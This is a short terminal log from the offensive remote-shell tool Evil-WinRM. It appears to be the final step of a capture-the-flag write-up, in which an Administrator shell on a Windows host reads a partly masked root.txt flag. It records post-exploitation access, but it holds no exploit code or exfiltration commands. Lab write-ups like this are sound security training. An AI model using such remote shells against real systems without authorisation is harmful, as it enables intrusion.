Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
087be6edc8----------------------
```
